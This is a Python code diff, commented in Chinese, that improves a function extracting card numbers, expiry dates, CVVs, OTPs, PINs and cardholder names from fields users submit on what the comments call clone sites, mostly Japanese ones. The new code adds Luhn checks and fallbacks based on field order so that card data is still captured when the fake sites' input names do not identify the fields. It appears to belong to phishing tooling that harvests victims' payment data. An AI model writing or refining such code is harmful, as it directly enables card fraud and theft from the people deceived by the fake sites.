@@ -2251,13 +2251,38 @@ def detect_brand(number: str) -> str:
     return ""
 
 
+# 名字里带这些词的字段不可能是卡号（是 CVV 或有效期）
+CARD_SKIP_TOKENS = ("cvv", "cvc", "cvn", "セキュリティ", "有効期限", "expiry", "expiration")
+
+
+def luhn_ok(digits: str) -> bool:
+    """Luhn 校验：判断一串 13~19 位数字像不像卡号。
+
+    仿站的 input name 经常不可靠（见 extract_card_values），靠值本身兜底。
+    """
+    if not digits.isdigit() or not 13 <= len(digits) <= 19:
+        return False
+    total = 0
+    for index, ch in enumerate(reversed(digits)):
+        value = int(ch)
+        if index % 2 == 1:
+            value *= 2
+            if value > 9:
+                value -= 9
+        total += value
+    return total % 10 == 0
+
+
 def extract_card_values(flat: dict) -> dict:
     """从用户填写的字段里认出卡号 / 有效期 / CVV / OTP / PIN 等。
 
-    先精确匹配别名，再按包含关系兜底（这类仿站的 input name 各站不同，
-    日文站常是「カード番号」「セキュリティコード」这种写法）。
+    先精确匹配别名，再按内容兜底。日本站这类仿站的 input name 经常是
+    「_例__0123_4567_8910_1234」这种提示文字，名字里根本没有 card，
+    只能靠「13~19 位数字 + Luhn 校验」判断；有效期和 CVV 再按卡号之后的
+    字段顺序（番号 → 月 → 年 → セキュリティコード）补。
     """
     out: dict[str, str] = {}
+    entries: list[tuple[str, str, str]] = []
     for key, value in (flat or {}).items():
         if value in (None, ""):
             continue
@@ -2267,19 +2292,67 @@ def extract_card_values(flat: dict) -> dict:
         k = norm_key(key)
         if not k:
             continue
-        digits = re.sub(r"\D", "", text)
-        # 卡号：名称里有卡字样，值去掉空格后是 13~19 位数字
-        if "ccard" not in out and 13 <= len(digits) <= 19:
-            if any(token in k for token in ("card", "カード", "ccard", "pan")) \
-                    and not any(skip in k for skip in ("cvv", "cvc", "セキュリティ", "有効期限", "expiry")):
-                out["ccard"] = digits
-                continue
-        for field, aliases in CARD_ALIASES.items():
-            if field in out:
-                continue
-            if any(k == norm_key(a) or k.startswith(norm_key(a)) or norm_key(a) in k for a in aliases):
+        entries.append((k, text, re.sub(r"\D", "", text)))
+
+    # 1) 卡号：字段名命中优先，Luhn 校验兜底
+    for k, _, digits in entries:
+        if "ccard" in out:
+            break
+        if not 13 <= len(digits) <= 19:
+            continue
+        if any(skip in k for skip in CARD_SKIP_TOKENS):
+            continue
+        if any(token in k for token in ("card", "カード", "ccard", "pan")) or luhn_ok(digits):
+            out["ccard"] = digits
+
+    # 2) 其余字段按别名匹配
+    for field, aliases in CARD_ALIASES.items():
+        if field in out:
+            continue
+        wanted = [norm_key(a) for a in aliases if norm_key(a)]
+        for k, text, _ in entries:
+            if any(k == a or k.startswith(a) or a in k for a in wanted):
                 out[field] = text[:128]
                 break
+
+    card_index = next((i for i, (_, _, d) in enumerate(entries) if d and d == out.get("ccard")), -1)
+    if card_index < 0:
+        return out
+
+    # 3) 有效期兜底：卡号之后第一个 1~12 的两位数是月，另一个两位数是年
+    #    （年份可能是 2030 这种四位，取后两位）
+    if "cdate" not in out:
+        month = year = ""
+        for k, _, digits in entries[card_index + 1:]:
+            if any(skip in k for skip in CARD_SKIP_TOKENS):
+                continue
+            if len(digits) == 4 and digits[:2] in ("19", "20"):
+                year = digits[-2:]
+                continue
+            if len(digits) != 2:
+                continue
+            if not month and 1 <= int(digits) <= 12:
+                month = digits
+            elif not year:
+                year = digits
+        if month and year:
+            out["cdate"] = f"{month}/{year}"
+
+    # 4) 持卡人名兜底：卡号之前第一段不含数字、不含 @ 的短文本
+    if "cname" not in out:
+        for _, text, digits in entries[:card_index]:
+            if digits or "@" in text or not 1 <= len(text) <= 60:
+                continue
+            out["cname"] = text[:128]
+            break
+
+    # 5) CVV 兜底：卡号之后字段名明确是 CVV 的 3~4 位数字
+    if "ccvv" not in out:
+        for k, _, digits in entries[card_index + 1:]:
+            if any(skip in k for skip in CARD_SKIP_TOKENS) and 3 <= len(digits) <= 4:
+                out["ccvv"] = digits
+                break
+
     return out
 
 
